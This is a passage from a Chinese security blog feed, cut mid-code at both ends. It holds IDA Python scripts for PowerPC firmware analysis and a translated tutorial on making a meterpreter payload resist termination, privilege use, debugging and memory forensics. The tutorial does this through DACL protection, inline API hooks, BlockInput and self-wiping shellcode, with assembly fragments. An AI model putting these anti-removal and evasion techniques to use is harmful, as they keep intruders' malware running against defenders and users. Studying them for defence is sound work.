csv.DictReader(file)</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">            start = int(row[<span class="string">'Location'</span>], <span class="number">16</span>)</span><br><span class="line">            starts.append(start)</span><br><span class="line">    <span class="keyword">return</span> starts</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_ida_funcs</span><span class="params">(starts)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> index, start <span class="keyword">in</span> enumerate(starts):</span><br><span class="line">        ida_funcs.add_func(start)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    file_path=ida_kernwin.ask_file(<span class="number">1</span>, <span class="string">"*"</span>, <span class="string">"ghidra export functions csv file path"</span>)</span><br><span class="line">    starts = get_funcs_addr(file_path)</span><br><span class="line">    add_ida_funcs(starts)</span><br><span class="line">    print(<span class="string">"[+] done"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>只需要填入ghirda导出的csv文件路径即可。</p>
<div align="center"><br><img src="/img/firmware_ida_functions.png" align><br></div>

<h3 id="方法二-使用PowerPC函数序言prologue特征码">方法二.使用PowerPC函数序言prologue特征码</h3><p>大部分编译器编译生成的函数头可能会有一些固定的指令，如x86平台的mov edi, edi;push ebp，这种情况在PowerPc也存在PowerPC特征码为stwu rS,rD(n);mflr r0,我们可以利用这个特征编写ida python脚本使ida开始自动反编译固件生成函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ida_kernwin</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_ida</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span><br><span class="line">ida pro 7.5  python3</span><br><span class="line">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_func_prologue</span><span class="params">(file_path, pattern)</span>:</span></span><br><span class="line">    f = open(file_path, <span class="string">"rb"</span>)</span><br><span class="line">    image_data = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    bytes_data = bytearray(image_data)</span><br><span class="line">    re_pattern = re.compile(pattern)</span><br><span class="line">    addrs = []</span><br><span class="line">    <span class="keyword">for</span> match_obj <span class="keyword">in</span> re_pattern.finditer(bytes_data):</span><br><span class="line">        addrs.append(match_obj.start())</span><br><span class="line">    <span class="keyword">return</span> addrs</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auto_make_function</span><span class="params">(prolog_addrs)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> prolog_addrs:</span><br><span class="line">        ida_funcs.add_func(ida_ida.inf_get_min_ea() + addr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ppc_prologue = <span class="string">b"\x94.&#123;2&#125;\xF8\x7C\x08\x02\xA6"</span></span><br><span class="line">    file_path=ida_kernwin.ask_file(<span class="number">1</span>, <span class="string">"*"</span>, <span class="string">"firmware path"</span>)</span><br><span class="line">    addrs = find_func_prologue(file_path, ppc_prologue)</span><br><span class="line">    print(<span class="string">"[+] find %d func prologue"</span>%len(addrs))</span><br><span class="line">    auto_make_function(addrs)</span><br><span class="line">    print(<span class="string">"[+] done"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>其实在github发现一个类似的脚本(<a href="https://github.com/maddiestone/IDAPythonEmbeddedToolkit/blob/master/define_code_functions.py)，但是这个是针对ida" target="_blank" rel="external">https://github.com/maddiestone/IDAPythonEmbeddedToolkit/blob/master/define_code_functions.py)，但是这个是针对ida</a> 7.0编写的，本来想移植过来的，折腾了下最后还是自己写一个简单点。</p>
<h2 id="0x03_通过sig优化库函数识别">0x03 通过sig优化库函数识别</h2><p>由于固件文件并不像PE、ELF文件有导入表，ida中也没有内置的sig文件，所有的函数都必须靠自己人工识别，工作量太大了，不过强大的ida pro可以自己创建sig文件，经过一番折腾，可以识别libc中一些字符串处理的函数，这里列以下尝试了哪些方法。</p>
<ul>
<li>搜索获取powerpc相关sig库，<a href="https://github.com/IridiumXOR/uclibc-sig" target="_blank" rel="external">https://github.com/IridiumXOR/uclibc-sig</a></li>
<li>安装linux powerpc交叉编译库，提取lib</li>
<li>根据固件中的Copyright string: “Copyright MGC 2004 - Nucleus PLUS - MPC860 Diab C/C++ v. 1.14”字符串，安装VxWorks Tornado开发环境，提取lib<br>最后还是Tornado开发环境中提取的lib制作的sig有效，这里分享下<a href="https://pan.baidu.com/s/17ulZN" target="_blank" rel="external">Tornado.V2.2.POWERPC下载地址</a>，我是xp环境才安装运行成功的，提取的路径如下C:\Tornado\host\diab\PPCCS<br>效果如下：</li>
</ul>
<div align="center"><br><img src="/img/firmware_ida_sig.png" align><br></div>

<h2 id="0x04_TODO">0x04 TODO</h2><p>由于并没有实际运行环境，这里并没有进行动态分析，分析起来难度较大，后续可能尝试能否使用qemu-system模式将固件运行起来进行动态调试。</p>
<h2 id="0x05_参考">0x05 参考</h2><p><a href="https://cq674350529.github.io/2021/03/04/Zyxel设备eCos固件加载地址分析/" target="_blank" rel="external">Zyxel设备eCos固件加载地址分析</a><br><a href="http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=1018812112.nh&amp;dbcode=CDFD&amp;dbname=CDFDREF" target="_blank" rel="external">ARM设备固件装载基址定位的研究_朱瑞瑾</a><br><a href="https://bbs.pediy.com/thread-191928.htm" target="_blank" rel="external">PowerPC下C逆向指南</a><br><a href="http://blog.nsfocus.net/function-recognition-reverse-engineering-iot-equipment/" target="_blank" rel="external">IOT设备逆向工程中的函数识别</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x0_简介">0x0 简介</h2><p><strong>本文已被看雪智能设备版本设置为精华文章：<a href="https://bbs.pediy.com/thread-266803.htm">https://bbs.pediy.com/thread-266803.htm</a></strong><br>获取到一个设备的固件，有6M，基本没在网上找到对该固件进行分析的文章，因此决定按照固件分析的一般思路对该固件进行逆向分析，实践学习下。主要用到的工具binwalk、ida pro 7.5、ghidra。首先使用binwalk获取固件基础信息，首先看下能不能提取出文件来：</p>
<div align="center"><br><img src="/img/firmware_binwalk_e.png" align=""/><br></div>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[反检测的艺术4-自保护（翻译）]]></title>
    <link href="http://www.youngroe.com/2020/10/02/Cybersecurity/art-of-anti-detection-4-art-of-anti-detection-4-self-defense/"/>
    <id>http://www.youngroe.com/2020/10/02/Cybersecurity/art-of-anti-detection-4-art-of-anti-detection-4-self-defense/</id>
    <published>2020-10-02T11:39:22.000Z</published>
    <updated>2021-03-18T12:43:38.267Z</updated>
    <content type="html"><![CDATA[<p>在反检测的艺术系列中，我们主要研究了如何绕过自动化安全产品的方法，但是在这一部分中，我们将重点介绍几种自保护方法，保护我们在目标终端上的载荷免受其实际用户的破坏。用户可能是缺乏网络技术的员工或也有可能是网络安全部门的蓝队成员。我们的目的是在没有任何特权的情况下存活并在目标终端中隐藏我们的存在。但是，在继续学习之前，我建议您阅读本系列的前几篇文章，因为这些自保护方法包含大量的有关shellcoding和API hooking的前置知识，现在我们开始吧！<br><a id="more"></a><br>在渗透测试时我们常使用meterpreter载荷，因此我们的主要目标将是为Metasploit构建一个后漏洞利用模块。该模块激活后应能够保护运行meterpreter载荷的进程免受用户干预。同样，在设计此模块时，我们将以x86和x64 Shellcode形式实现这些自保护方法，这将使我们能够将该自保护方法部署到其他正在运行的进程中。首先，我们需要考虑用户如何破坏目标系统上的会话。第一个明显的操作是用几个系统内置工具来终止未知/可疑的过程。我们的第一个技巧将是防止进程终止。在本文中，我们将假定我们的meterpreter会话与用户具有相同的特权。因为这是公司网络中最有可能发生的情况。公司的大多数用户帐户没有管理权限。我们将通过利用Windows内部的某些逻辑来尝试实现。因此，该模块应该能够在不提升特权的情况下工作。由于Windows用户帐户控制（UAC）的原因，我们将针对不同的Windows版本考虑不同的策略。</p>
<h2 id="0x00_进程保护">0x00 进程保护</h2><p>第一个技巧将针对Windows 7及更低版本。尽管Windows 7已有10年的历史，但仍在世界范围内大量使用。在这些版本中，非管理员用户可以创建受保护的进程，这会导致一种奇怪的情况，即用户创建了无法被创建者终止的进程。当一个进程受到保护时，只有管理员用户可以对其进行操作。当非管理员用户尝试终止受保护的进程会弹出错误提示，</p>
<div align="center"><br><img src="/img/anti_av4_terminate_process.gif" align><br></div>

<p>同样不仅有关终止进程，还禁止所有与打开受保护进程的句柄有关的操作。为了保护进程，我们需要设置一个特殊的安全描述符。根据MSDN，安全描述符结构包含与对象关联的安全信息。如;</p>
<ul>
<li>所有者<a href="https://docs.microsoft.com/windows/desktop/SecGloss/s-gly" target="_blank" rel="external">安全标识符</a>（SID）</li>
<li>组SID</li>
<li><a href="https://docs.microsoft.com/windows/desktop/SecGloss/d-gly" target="_blank" rel="external">访问控制列表</a>（DACL）</li>
<li><a href="https://docs.microsoft.com/windows/desktop/SecGloss/s-gly" target="_blank" rel="external">系统访问控制列表</a>（SACL）</li>
<li>前述项目的预选赛</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _SECURITY_DESCRIPTOR &#123;</span><br><span class="line">  BYTE                        Revision;</span><br><span class="line">  BYTE                        Sbz1;</span><br><span class="line">  SECURITY_DESCRIPTOR_CONTROL Control;</span><br><span class="line">  PSID                        Owner;</span><br><span class="line">  PSID                        Group;</span><br><span class="line">  PACL                        Sacl;</span><br><span class="line">  PACL                        Dacl;</span><br><span class="line">&#125; SECURITY_DESCRIPTOR, *PISECURITY_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
<p>这些结构可以用安全描述符字符串格式表示，该格式是用于在安全描述符中存储或传输信息的文本格式。格式是一个以令牌结尾的空终止字符串，用于指示安全描述符的四个主要组成部分：所有者（O :)，主要组（G :)，DACL（D :)和SACL（S :)。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:owner_sid</span><br><span class="line">G:group_sid</span><br><span class="line">D:dacl_flags(string_ace1)(string_ace2)... (string_acen)</span><br><span class="line">S:sacl_flags(string_ace1)(string_ace2)... (string_acen)</span><br></pre></td></tr></table></figure>
<p>为了保护进程，我们需要将D：P设置为SE_DACL_PROTECTED标志。为了在进程的SECURITY_DESCRIPTOR中设置此类标志，我们需要使用特定的Windows API函数。首先，我们需要将字符串安全描述符格式转换为适当的安全描述符结构。为此，我们将调用<a href="https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora" target="_blank" rel="external">ConvertStringSecurityDescriptorToSecurityDescriptorA</a>函数。该功能采用以下参数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ConvertStringSecurityDescriptorToSecurityDescriptorA</span><span class="params">(</span><br><span class="line">  LPCSTR               StringSecurityDescriptor,</span><br><span class="line">  DWORD                StringSDRevision,</span><br><span class="line">  PSECURITY_DESCRIPTOR *SecurityDescriptor,</span><br><span class="line">  PULONG               SecurityDescriptorSize</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>如上所示，需要有一个已经声明的安全描述符结构来设置新的描述符。我们将首先声明一个SECURITY_ATTRIBUTES结构，其中将包含我们的SECURITY_DESCRIPTOR。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SECURITY_ATTRIBUTES sa;</span><br><span class="line">TCHAR * szSD = TEXT(<span class="string">"D:P"</span>);</span><br><span class="line">sa.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">sa.bInheritHandle = FALSE;</span><br><span class="line"></span><br><span class="line">ConvertStringSecurityDescriptorToSecurityDescriptor(szSD,SDDL_REVISION_1, &amp;(sa.lpSecurityDescriptor)</span><br></pre></td></tr></table></figure>
<p>将字符串安全描述符转换为SECURITY_ATTRIBUTES结构之后，现在我们需要获取要保护的进程句柄。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());</span><br></pre></td></tr></table></figure>
<p>最后，我们将调用SetKernelObjectSecurity，此函数设置内核对象的安全性。设置好准备的安全描述符后，我们的进程终于可以免受野蛮用户的侵害了。现在，我们需要将这一系列API调用转换为shellcode。除了创建SECURITY_ATTRIBUTES结构之外，对此没有什么棘手的问题。我们将总共执行4个API调用，最多包含4个参数。根据我们的shellcoding文章，构造这样的shellcode应该没有问题。唯一棘手的部分是创建SECURITY_ATTRIBUTES结构，因为您需要以字节为单位计算结构的总大小，并在首次创建时复制存储在内部的值。为了简化工作，编译用C编写的代码，然后使用调试器查看SECURITY_ATTRIBUTES结构。</p>
<div align="center"><br><img src="/img/anti_av4_x86_api.png" align><br></div><br>在x86系统中，此结构的长度为12个字节，在x64系统中，此大小加倍。产生的汇编代码应如下所示；<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; x86 ConvertStringSecurityDescriptorToSecurityDescriptor call</span><br><span class="line">    push <span class="number">0x00503a44</span>            ; <span class="string">"D:P"</span></span><br><span class="line">    sub esp,<span class="number">4</span>                  ; Push the address of <span class="string">"D:P"</span> <span class="built_in">string</span> to <span class="built_in">stack</span></span><br><span class="line">    push <span class="number">0x00000000</span>            ; FALSE</span><br><span class="line">    lea eax, [esp+<span class="number">4</span>]           ; Load the address of <span class="number">4</span> byte buffer to EAX</span><br><span class="line">    push eax                   ; Push the <span class="number">4</span> byte buffer address</span><br><span class="line">    push <span class="number">0x00000001</span>            ; SDDL_REVISION_1 </span><br><span class="line">    lea eax, [esp+<span class="number">16</span>]          ; Load the address of <span class="string">"D:P"</span> <span class="built_in">string</span> to EAX</span><br><span class="line">    push eax                   ; Push the EAX value</span><br><span class="line">    push <span class="number">0xDA6F639A</span>            ; hash(advapi32.dll, ConvertStringSecurityDescriptorToSecurityDescriptor)</span><br><span class="line">    call ebp                   ; ConvertStringSecurityDescriptorToSecurityDescriptor(<span class="string">"D:P"</span>,SDDL_REVISION_1,FALSE)</span><br></pre></td></tr></table></figure><br><br>其余的shellcoding应该更容易。我们还需要考虑一个微小的细节。我们将使用Metasploit框架的<a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Post/Windows/Process:execute_shellcode" target="_blank" rel="external">execute_shellcode</a>函数。此函数只是将shellcode注入进程，然后通过打开远程线程来执行它。执行完后，我们的shellcode需要调用适当的函数来正确终止线程。这意味着我们需要在所有shellcode的末尾附加<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_exitfunk.asm" target="_blank" rel="external">block_exitfunk.asm</a>代码。该块确定当前的Windows版本，并相应地调用适当的退出函数。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[BITS <span class="number">64</span>]</span><br><span class="line"></span><br><span class="line">exitfunk:</span><br><span class="line">  mov ebx, <span class="number">0x0A2A1DE0</span>   ; The EXITFUNK as specified by user...</span><br><span class="line">  mov r10d, <span class="number">0x9DBD95A6</span>  ; hash( <span class="string">"kernel32.dll"</span>, <span class="string">"GetVersion"</span> )</span><br><span class="line">  call rbp              ; GetVersion(); (AL will = major version and AH will = minor version)</span><br><span class="line">  add rsp, <span class="number">40</span>           ; cleanup the <span class="keyword">default</span> param space on <span class="built_in">stack</span></span><br><span class="line">  cmp al, byte <span class="number">6</span>        ; If we are not running on Windows Vista, <span class="number">2008</span> or <span class="number">7</span></span><br><span class="line">  jl <span class="keyword">short</span> goodbye      ; Then just call the <span class="built_in">exit</span> function...</span><br><span class="line">  cmp bl, <span class="number">0xE0</span>          ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, <span class="number">2008</span> or <span class="number">7.</span>..</span><br><span class="line">  jne <span class="keyword">short</span> goodbye     ;</span><br><span class="line">  mov ebx, <span class="number">0x6F721347</span>   ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread</span><br><span class="line">goodbye:                ; We now perform the actual call to the <span class="built_in">exit</span> function</span><br><span class="line">  push byte <span class="number">0</span>           ;</span><br><span class="line">  pop rcx               ; <span class="built_in">set</span> the <span class="built_in">exit</span> function parameter</span><br><span class="line">  mov r10d, ebx         ; place the correct EXITFUNK into r10d</span><br><span class="line">  call rbp              ; <span class="function">call <span class="title">EXITFUNK</span><span class="params">( <span class="number">0</span> )</span></span>;</span><br></pre></td></tr></table></figure><br><br>这是此方法的完整<a href="https://github.com/EgeBalci/SelfDefense/blob/master/x86/ProtectProcess/protect_process.asm" target="_blank" rel="external">x86</a>和<a href="https://github.com/EgeBalci/SelfDefense/blob/master/x64/ProtectProcess/protect_process.asm" target="_blank" rel="external">x64</a> shellcode。但是这种方法只能解决一半的过程终止问题。具有管理特权的用户仍可以通过以管理员身份运行进程终止工具来终止受保护的进程。因此，我们的第二个技巧应该用户UAC提权。<br><br>## 防止提权<br>为了防止特权提升，我们需要了解进程如何获取某些特权。当进程需要执行某些任务时，因此它需要具有适当的访问令牌，需要特殊的权限。终止或打开受保护进程的句柄也需要某些令牌。有几种获取这些访问令牌的方法，几乎​​所有方法都包括以下两个API函数的使用：<br><br>第一个是<a href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges" target="_blank" rel="external">AdjustTokenPrivileges</a>，此功能启用或禁用指定访问令牌中的特权。几乎所有需要令牌操作的特权操作都使用此API函数。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">AdjustTokenPrivileges</span><span class="params">(</span><br><span class="line">  HANDLE            TokenHandle,</span><br><span class="line">  BOOL              DisableAllPrivileges,</span><br><span class="line">  PTOKEN_PRIVILEGES NewState,</span><br><span class="line">  DWORD             BufferLength,</span><br><span class="line">  PTOKEN_PRIVILEGES PreviousState,</span><br><span class="line">  PDWORD            ReturnLength</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure><br><br>第二个重要函数是<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-rtlsetdaclsecuritydescriptor" target="_blank" rel="external">RtlSetDaclSecurityDescriptor</a>，此函数设置绝对格式安全描述符的DACL信息，或者如果安全描述符中已经存在DACL，则将其取代。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSYSAPI NTSTATUS <span class="title">RtlSetDaclSecurityDescriptor</span><span class="params">(</span><br><span class="line">  PSECURITY_DESCRIPTOR SecurityDescriptor,</span><br><span class="line">  BOOLEAN              DaclPresent,</span><br><span class="line">  PACL                 Dacl,</span><br><span class="line">  BOOLEAN              DaclDefaulted</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure><br><br>从理论上讲，如果我们能够找到一种方法来禁用进程中的这两个功能，让它根本无法更改其令牌特权，因此无法执行特权操作。为了在远程进程中禁用这两个功能，我们需要使用内联API挂钩。我们使用内联挂钩的原因是因为我们的目标主要是任务管理器之类的系统进程。这些系统二进制文件没有在导入地址表中使用函数地址，而是在运行时动态加载所需的API函数。因此，patch IAT条目（IAT挂钩）对我们而言不起作用，我们需要能够直接重定向或patch这些功能。为了实现这一点，我们需要使用一个内联钩子汇编块。此块patch了函数序言的前两个字节，使我们可以将函数重定向到其他地方或返回任何值。在我们的情况下，我们需要它返回true。这个汇编模块，它需要一个名为patch的二进制文件，其中包含在函数序言部分写入汇编指令功能。为了从这些函数返回true，应遵循以下说明；<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; x64 <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">db <span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>    ; xor rax,rax</span><br><span class="line">db <span class="number">0xc3</span>              ; ret</span><br><span class="line"></span><br><span class="line">; x86 <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">db <span class="number">0x32</span>,<span class="number">0xc0</span>         ; xor eax,eax</span><br><span class="line">db <span class="number">0xc3</span>              ; ret</span><br></pre></td></tr></table></figure><br><br>现在，此块将使用给定的哈希值对函数进行修补，并使其返回零。一旦在进程内执行此shellcode，任何令牌提升尝试都将返回false，因此该进程将无法升级特权。<br><br><br>## 阻止输入<br><br>这是次要的细节。我们的meterpreter载荷可能正在带有图形用户界面的应用程序内部运行，这可能意味着可能有多个按钮用于终止应用程序。通过调用<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-blockinput" target="_blank" rel="external">BlockInput</a> API函数，我们将阻止所有键盘和鼠标输入事件到达托管有效载荷的应用程序。<br><br>## 自我移除<br>这是开发此模块的最重要作用之一。我没有指定调用API函数的任何特定方法，可以通过几种方法来完成，但是更简单的方法是使用Metasploit block API。但使用block API具有很大的挑战，可被安全产品检测到。在尝试保持存在并保持存活的同时，我们还需要从内存中删除所有可疑shellcode，尤其是block API。因此，在完成保护进程并在其他进程进行hook之后，我们需要设置一个序幕prologue，该序幕prologue将清除内存中的shellcode。但是此任务有点棘手，因为要终止线程，我们需要调用适当的API函数。要调用函数，我们还需要block API。这种情况迫使我们首先获取所需的终止函数地址，然后从内存中擦除shellcode。生成的shellcode应该看起来像这样；<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">    push 0x0000006c                 ; 0x00,l</span><br><span class="line">    push 0x6c642e6c                 ; ld.l</span><br><span class="line">    push 0x6c64746e                 ; ldtn</span><br><span class="line">    push esp                        ; &amp;"ntdll.dll"</span><br><span class="line">    push 0x0726774C                 ; hash("KERNEL32.dll", "LoadLibraryA")</span><br><span class="line">    call ebp                        ; LoadLibraryA("ntdll.dll")</span><br><span class="line">    push 0x00000064                 ; 0x00,d</span><br><span class="line">    push 0x61657268                 ; aerh</span><br><span class="line">    push 0x54726573                 ; Tres</span><br><span class="line">    push 0x55746978                 ; Utix</span><br><span class="line">    push 0x456c7452                 ; EltR</span><br><span class="line">    push esp                        ; &amp;"RtlExitUserThread"</span><br><span class="line">    push eax                        ; HANDLE (KERNEL32.dll)</span><br><span class="line">    push 0x7802F749                 ; hash("KERNEL32.dll", "GetProcAddress")</span><br><span class="line">    call ebp                        ; GetProcAddress(HANDLE, "RtlExitUserThread")</span><br><span class="line">    mov ebp,eax                     ; Save the RtlExitUserThread address to EDI</span><br><span class="line">    ; PEB manipulation</span><br><span class="line">    xor eax,eax                     ; Zero EAX (upper 3 bytes will remain zero until function is found)</span><br><span class="line">    mov ebx,[fs:eax+0x30]           ; Get a pointer to the PEB</span><br><span class="line">    mov ebx,[ebx+0x0C]              ; Get PEB-&gt;Ldr  </span><br><span class="line">    mov eax,[ebx + 0x0C]            ; InOrderModuleList</span><br><span class="line">    mov dword [eax+0x20],0xFFFFFF   ; SizeOfImage</span><br><span class="line">    ; Wipe self defense shellcode</span><br><span class="line">total_size: equ $-self_defense      ; Set the size of the self defense shellcode to total_size label</span><br><span class="line">    mov ecx,total_size              ; Move the total size of the self defense shellcode to ECX</span><br><span class="line">    call $+5</span><br><span class="line">    pop eax</span><br><span class="line">clean:</span><br><span class="line">    mov byte [eax],0x00             ; Wipe 1 byte</span><br><span class="line">    dec eax                         ; Increase index</span><br><span class="line">    loop clean                      ; Loop until all shellcode cleared from memory</span><br><span class="line">    push 0x00                       ; NULL              </span><br><span class="line">    call ebp                        ; RtlExitUserThread(0)</span><br></pre></td></tr></table></figure><br><br>对于某些安全产品，从内存中删除shellcode可能不够。设计变形编码器可能非常有帮助。为了简短起见，我不会在本文中包括编码部分。在编写了自我删除序言prologue之后，现在我们将它们全部合并在一起，最终的<a href="https://github.com/EgeBalci/SelfDefense/blob/master/x86/self_defense.asm" target="_blank" rel="external">x86</a>和<a href="https://github.com/EgeBalci/SelfDefense/blob/master/x64/self_defense.asm" target="_blank" rel="external">x64</a>自保护shellcode已准备好了。在继续执行Metasploit模块之前，我们还需要针对Windows不同版本实现不同的解决方案，该版本的Windows我们的之前提出的进程保护技术无效。<br><br>## 防止被终止<br><br>没有受保护的进程，Windows 8/10用户可以直接终止我们的会话。在这种情况下该怎么办？经过深思熟虑，一个明显的答案就浮现了，我们可以简单地在所有能够终止进程的程序中禁用所有进程终止API。但是我们还需要保护我们的载荷以免被分析。调试器和任何类型的监视工具也不应附加到我们的进程中。所有这些都可以通过挂钩OpenProcess API来实现。由于<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" target="_blank" rel="external">OpenProcess</a>是非常基础的API，我们可以通过注入进程利用多种方式对其削弱。某些程序一旦调用OpenProcess失败就会崩溃。这可以以更安全和隐秘的方式完成。我之所以选择它是因为懒，但是这解决了我们的进程被终止问题。我们可以使用前面的钩子shellcode。唯一需要更改的是传递给内联钩子块的函数散列。添加此代码后，我们的shellcoding阶段结束。<br><br><br>## Metasploit模块<br>现在，我们需要构造MSF post模块，该模块会将我们的shellcode注入相应的进程中。让我们从选择一个漏洞利用后模块模板开始。我们的模块不会采用任何强制性参数。将有两个可选参数，分别称为PID和LOOP。该模块应能够保护托管我们的meterpreter载荷的进程。 PID参数将指定要注入我们的shellcode的进程ID。 LOOP参数将指定模块是否连续运行。以下模板设置所需的漏洞利用后类和元数据。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 